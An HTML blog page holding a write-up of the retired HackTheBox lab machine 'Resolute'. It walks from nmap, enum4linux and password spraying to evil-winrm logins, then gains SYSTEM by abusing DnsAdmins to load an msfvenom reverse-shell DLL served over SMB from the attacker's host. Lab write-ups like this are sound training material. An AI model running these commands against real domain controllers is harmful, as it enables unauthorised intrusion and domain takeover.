@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Resolutre | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/pure-min.css">
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="https://maggick.fr/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="https://maggick.fr/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="https://maggick.fr/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="https://maggick.fr/2020/05/htb-resolutre.html" title="Read more" class="entry-title-link">
+                HTB: Resolutre</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-05-31T17:45:00+02:00">31 May 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="https://maggick.fr/author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="https://maggick.fr/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="https://maggick.fr/tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="https://maggick.fr/tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="https://maggick.fr/tag/dll.html" title="Read more with the label DLL" class="meta-link">DLL</a> 
+          <a href="https://maggick.fr/tag/dnsadmins.html" title="Read more with the label DnsAdmins" class="meta-link">DnsAdmins</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 12 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.05/resolute_card.png" alt="Resolute Card" width="262"></p>
+<p>This box is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/220">Resolute</a>.
+This box was created by
+<a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a> and publish on
+December the 7th 2019. The box is rated as a medium box. It implies a lot of
+enumeration and really interesting privilege escalation in Windows environment
+using DLL injection.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. As this is again (like with forest) a
+domain contronler a few ports are open. So much ports are open that a full
+TCPscan will take more than a day.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>nmap -p- -sS 10.10.10.169 -oA nmap</span>
+<span class="code-line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-10 09:49 EST</span>
+<span class="code-line">Stats: 0:10:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span>
+<span class="code-line">SYN Stealth Scan Timing: About 11.50% done; ETC: 11:22 (1:21:43 remaining)</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>Therefore we launch a basic nmap scan on the top 10 000 ports, 14 of them are
+open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Fri Dec 13 03:00:17 2019 as: nmap -sS -oA nmap --top-ports 10000 10.10.10.169</span>
+<span class="code-line">Nmap scan report for megabank.local (10.10.10.169)</span>
+<span class="code-line">Host is up (0.34s latency).</span>
+<span class="code-line">Not shown: 8306 closed ports</span>
+<span class="code-line">PORT      STATE SERVICE</span>
+<span class="code-line">53/tcp    open  domain</span>
+<span class="code-line">88/tcp    open  kerberos-sec</span>
+<span class="code-line">135/tcp   open  msrpc</span>
+<span class="code-line">139/tcp   open  netbios-ssn</span>
+<span class="code-line">389/tcp   open  ldap</span>
+<span class="code-line">445/tcp   open  microsoft-ds</span>
+<span class="code-line">464/tcp   open  kpasswd5</span>
+<span class="code-line">593/tcp   open  http-rpc-epmap</span>
+<span class="code-line">636/tcp   open  ldapssl</span>
+<span class="code-line">3268/tcp  open  globalcatLDAP</span>
+<span class="code-line">3269/tcp  open  globalcatLDAPssl</span>
+<span class="code-line">5985/tcp  open  wsman</span>
+<span class="code-line">9389/tcp  open  adws</span>
+<span class="code-line">47001/tcp open  winrm</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Fri Dec 13 03:07:34 2019 -- 1 IP address (1 host up) scanned in 437.35 seconds</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We run a version scan on this open ports. The ports 138 and 445 (SMB) are open
+as well as port 5985 and 47001 for winRM.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Fri Dec 13 03:10:58 2019 as: nmap -sSV -oA service -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.169</span>
+<span class="code-line">Nmap scan report for megabank.local (10.10.10.169)</span>
+<span class="code-line">Host is up (0.70s latency).</span>
+<span class="code-line"></span>
+<span class="code-line">PORT      STATE  SERVICE      VERSION</span>
+<span class="code-line">53/tcp    closed domain</span>
+<span class="code-line">88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-13 08:19:12Z)</span>
+<span class="code-line">135/tcp   open   msrpc        Microsoft Windows RPC</span>
+<span class="code-line">139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn</span>
+<span class="code-line">389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span>
+<span class="code-line">445/tcp   open   microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)</span>
+<span class="code-line">464/tcp   open   kpasswd5?</span>
+<span class="code-line">593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0</span>
+<span class="code-line">636/tcp   open   tcpwrapped</span>
+<span class="code-line">3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span>
+<span class="code-line">3269/tcp  open   tcpwrapped</span>
+<span class="code-line">5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">9389/tcp  open   mc-nmf       .NET Message Framing</span>
+<span class="code-line">47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Fri Dec 13 03:11:28 2019 -- 1 IP address (1 host up) scanned in 30.41 seconds</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We enumerate the box using
+<a href="https://github.com/portcullislabs/enum4linux">enum4linux</a> we got a list of
+account and a description with a password in it <code>Welcome123!</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>perl enum4linux.pl 10.10.10.169</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">=============================</span>
+<span class="code-line">|    Users on 10.10.10.169    |</span>
+<span class="code-line">=============================</span>
+<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.</span>
+<span class="code-line">index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain</span>
+<span class="code-line">index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela   Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika   Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire   Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude   Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.</span>
+<span class="code-line">index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain</span>
+<span class="code-line">index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account</span>
+<span class="code-line">index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus   Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak   Desc: Account created. Password set to Welcome123!</span>
+<span class="code-line">index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki    Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo    Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: (null)</span>
+<span class="code-line">index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally    Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon    Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve    Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie   Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita   Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)</span>
+<span class="code-line">index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>The creds doesn't work and doesn't allow to access the SMB share. We put all
+users in a file <code>users.txt</code> and then we use
+<a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to spray the
+password against all accounts. The <code>melanie</code> account is using the password!</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>crackmapexec smb 10.10.10.169 -u users.txt -p &#39;Welcome123!&#39;</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\ryan:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\sunita:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\sally:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\ulf:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\stevie:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\paulo:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\steve:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\per:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123!</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We can then enumerate the shares but nothing interesting.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>crackmapexec smb 10.10.10.169 -u melanie -p &#39;Welcome123!&#39; --shares</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123!</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        [+] Enumerating shares</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        SHARE           Permissions</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        -----           -----------</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        NETLOGON        READ</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        SYSVOL          READ</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        ADMIN$          NO ACCESS</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        IPC$            READ</span>
+<span class="code-line">CME          10.10.10.169:445 RESOLUTE        C$              NO ACCESS</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We can then use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to
+connect using Winrm. This let us get the user flag in <code>melanie</code> home folder.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ruby evil-winrm.rb -u melanie -p &#39;Welcome123!&#39; -i 10.10.10.169</span>
+<span class="code-line"></span>
+<span class="code-line">Evil-WinRM shell v1.8</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Establishing connection to remote endpoint</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; type ..\Desktop\user.txt</span>
+<span class="code-line">0c3be45fcfe249796ccbee8d3a978540</span>
+<span class="code-line"></code></pre></div>
+
+
+<h1 id="second-user">Second user</h1>
+<p>We start enumerating the box. We can even run a
+<a href="https://github.com/fox-it/BloodHound.py">Bloodhound</a> at it.</p>
+<p><img alt="Melanie's groups" src="/media/2020.05/resolute_1.png"></p>
+<p>Nothing really interesting except when looking thoroughly at the content of the <code>C:\</code> folder.
+We found a <code>PSTranscripts</code> folder. A
+<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript">PSTranscript</a>
+is simply a transcript of a powershell session.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\&gt; dir -force</span>
+<span class="code-line">    Directory: C:\</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Mode                LastWriteTime         Length Name</span>
+<span class="code-line">----                -------------         ------ ----</span>
+<span class="code-line">d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN</span>
+<span class="code-line">d--hsl        9/25/2019  10:17 AM                Documents and Settings</span>
+<span class="code-line">d-----        9/25/2019   6:19 AM                PerfLogs</span>
+<span class="code-line">d-r---        9/25/2019  12:39 PM                Program Files</span>
+<span class="code-line">d-----       11/20/2016   6:36 PM                Program Files (x86)</span>
+<span class="code-line">d--h--        9/25/2019  10:48 AM                ProgramData</span>
+<span class="code-line">d--h--        12/3/2019   6:32 AM                PSTranscripts</span>
+<span class="code-line">d--hs-        9/25/2019  10:17 AM                Recovery</span>
+<span class="code-line">d--hs-        9/25/2019   6:25 AM                System Volume Information</span>
+<span class="code-line">d-r---        12/4/2019   2:46 AM                Users</span>
+<span class="code-line">d-----        12/4/2019   5:15 AM                Windows</span>
+<span class="code-line">-arhs-       11/20/2016   5:59 PM         389408 bootmgr</span>
+<span class="code-line">-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT</span>
+<span class="code-line">-a-hs-       12/11/2019   8:48 AM      402653184 pagefile.sys</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We go through the folder until finding the transcript text file. Then we display
+it. Inside we see a few commands and then a backup command using the <code>ryan</code> user
+and its password <code>Serv3r4Admin4cc123!</code></p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\&gt; dir -force PSTranscripts\</span>
+<span class="code-line">    Directory: C:\PSTranscripts</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Mode                LastWriteTime         Length Name</span>
+<span class="code-line">----                -------------         ------ ----</span>
+<span class="code-line">d--h--        12/3/2019   6:45 AM                20191203</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\&gt; dir -force PSTranscripts\20191203\</span>
+<span class="code-line">    Directory: C:\PSTranscripts\20191203</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Mode                LastWriteTime         Length Name</span>
+<span class="code-line">----                -------------         ------ ----</span>
+<span class="code-line">-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\&gt; type PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</span>
+<span class="code-line">**********************</span>
+<span class="code-line">Windows PowerShell transcript start</span>
+<span class="code-line">Start time: 20191203063201</span>
+<span class="code-line">Username: MEGABANK\ryan</span>
+<span class="code-line">RunAs User: MEGABANK\ryan</span>
+<span class="code-line">Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)</span>
+<span class="code-line">Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding</span>
+<span class="code-line">Process ID: 2800</span>
+<span class="code-line">PSVersion: 5.1.14393.2273</span>
+<span class="code-line">PSEdition: Desktop</span>
+<span class="code-line">PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273</span>
+<span class="code-line">BuildVersion: 10.0.14393.2273</span>
+<span class="code-line">CLRVersion: 4.0.30319.42000</span>
+<span class="code-line">WSManStackVersion: 3.0</span>
+<span class="code-line">PSRemotingProtocolVersion: 2.3</span>
+<span class="code-line">SerializationVersion: 1.1.0.1</span>
+<span class="code-line">**********************</span>
+<span class="code-line">Command start time: 20191203063455</span>
+<span class="code-line">**********************</span>
+<span class="code-line">PS&gt;TerminatingError(): &quot;System error.&quot;</span>
+<span class="code-line">&gt;&gt; CommandInvocation(Invoke-Expression): &quot;Invoke-Expression&quot;</span>
+<span class="code-line">&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;-join($id,&#39;PS &#39;,$(whoami),&#39;@&#39;,$env:computername,&#39; &#39;,$((gi $pwd).Name),&#39;&gt; &#39;)</span>
+<span class="code-line">if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&quot;</span>
+<span class="code-line">&gt;&gt; CommandInvocation(Out-String): &quot;Out-String&quot;</span>
+<span class="code-line">&gt;&gt; ParameterBinding(Out-String): name=&quot;Stream&quot;; value=&quot;True&quot;</span>
+<span class="code-line">**********************</span>
+<span class="code-line">Command start time: 20191203063455</span>
+<span class="code-line">**********************</span>
+<span class="code-line">PS&gt;ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;PS megabank\ryan@RESOLUTE Documents&gt; &quot;</span>
+<span class="code-line">PS megabank\ryan@RESOLUTE Documents&gt;</span>
+<span class="code-line">**********************</span>
+<span class="code-line">Command start time: 20191203063515</span>
+<span class="code-line">**********************</span>
+<span class="code-line">PS&gt;CommandInvocation(Invoke-Expression): &quot;Invoke-Expression&quot;</span>
+<span class="code-line">&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We can then login with the ryan user still using
+<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ruby evil-winrm.rb -u ryan -p &#39;Serv3r4Admin4cc123!&#39; -i 10.10.10.169</span>
+<span class="code-line">C:\Users\ryan\Desktop&gt; type note.txt</span>
+<span class="code-line">Email to team:</span>
+<span class="code-line"></span>
+<span class="code-line">- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute</span>
+<span class="code-line"></code></pre></div>
+
+
+<h1 id="root">Root</h1>
+<p>We enumerate our new permissions. Using
+<a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a> we see that we are part
+of the <code>DNSADMINS</code> group.</p>
+<p><img alt="Ryan's groups" src="/media/2020.05/resolute_2.png"></p>
+<p>We can confirm this by using <code>whoami /all</code> (I remove the "SUID" and "Attributes"
+columns for more clarity).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; whoami /all</span>
+<span class="code-line"></span>
+<span class="code-line">USER INFORMATION</span>
+<span class="code-line">----------------</span>
+<span class="code-line">User Name     SID</span>
+<span class="code-line">============= ==============================================</span>
+<span class="code-line">megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">GROUP INFORMATION</span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">Group Name                                 Type</span>
+<span class="code-line">========================================== ================</span>
+<span class="code-line">Everyone                                   Well-known group</span>
+<span class="code-line">BUILTIN\Users                              Alias</span>
+<span class="code-line">BUILTIN\Pre-Windows 2000 Compatible Access Alias</span>
+<span class="code-line">BUILTIN\Remote Management Users            Alias</span>
+<span class="code-line">NT AUTHORITY\NETWORK                       Well-known group</span>
+<span class="code-line">NT AUTHORITY\Authenticated Users           Well-known group</span>
+<span class="code-line">NT AUTHORITY\This Organization             Well-known group</span>
+<span class="code-line">MEGABANK\Contractors                       Group</span>
+<span class="code-line">MEGABANK\DnsAdmins                         Alias</span>
+<span class="code-line">NT AUTHORITY\NTLM Authentication           Well-known group</span>
+<span class="code-line">Mandatory Label\Medium Mandatory Level     Label</span>
+<span class="code-line"></span>
+<span class="code-line">PRIVILEGES INFORMATION</span>
+<span class="code-line">----------------------</span>
+<span class="code-line"></span>
+<span class="code-line">Privilege Name                Description                    State</span>
+<span class="code-line">============================= ============================== =======</span>
+<span class="code-line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span>
+<span class="code-line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
+<span class="code-line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>A few Google research allow us to find that being DNSAdmin allow for privilege
+escalation. The technique is to change the DNS configuration so it will load a
+DLL when starting the DNS service. We can either charge the DLL locally or
+remotely using SMB.</p>
+<ul>
+<li><a href="https://adsecurity.org/?p=4064">https://adsecurity.org/?p=4064</a></li>
+<li><a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md</a></li>
+<li><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html</a></li>
+<li><a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</a></li>
+</ul>
+<p>In order to write the DLL we use <code>msfvenom</code> with a classic reverse shell
+payload.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&quot;10.10.14.56&quot; LPORT=4444 -f dll -o ~/srv/msf3.dll</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We start our SMB server using
+<a href="https://github.com/SecureAuthCorp/impacket">impacket</a> <code>smbserver.py</code></p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python smbserver.py -ip 10.10.14.56 IOIO ~/srv/</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>Registry property serverlevelplugindll successfully reset.
+Command completed successfully. We start our handler using metasploit. And using
+our shell as <code>ryan</code> we change the DNS configuration, stop the DNS service and
+start it back using <code>sc.exe</code>. We can see in our SMB server's logs that our
+DLL is sent to the server. And we can see on our metasploit handler that we get
+a revershell. We can then easily get the root flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>::: text</span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\ryan&gt; dnscmd /config /serverlevelplugindll \\10.10.14.56\IOIO\msf3.dll</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\ryan&gt; sc.exe stop dns</span>
+<span class="code-line"></span>
+<span class="code-line">SERVICE_NAME: dns</span>
+<span class="code-line">        TYPE               : 10  WIN32_OWN_PROCESS</span>
+<span class="code-line">        STATE              : 3  STOP_PENDING</span>
+<span class="code-line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span>
+<span class="code-line">        WIN32_EXIT_CODE    : 0  (0x0)</span>
+<span class="code-line">        SERVICE_EXIT_CODE  : 0  (0x0)</span>
+<span class="code-line">        CHECKPOINT         : 0x1</span>
+<span class="code-line">        WAIT_HINT          : 0x7530</span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\ryan&gt; sc.exe start dns</span>
+<span class="code-line"></span>
+<span class="code-line">SERVICE_NAME: dns</span>
+<span class="code-line">        TYPE               : 10  WIN32_OWN_PROCESS</span>
+<span class="code-line">        STATE              : 2  START_PENDING</span>
+<span class="code-line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span>
+<span class="code-line">        WIN32_EXIT_CODE    : 0  (0x0)</span>
+<span class="code-line">        SERVICE_EXIT_CODE  : 0  (0x0)</span>
+<span class="code-line">        CHECKPOINT         : 0x0</span>
+<span class="code-line">        WAIT_HINT          : 0x7d0</span>
+<span class="code-line">        PID                : 4980</span>
+<span class="code-line">        FLAGS              :</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>The metasploit handler is running simultaneously.</p>
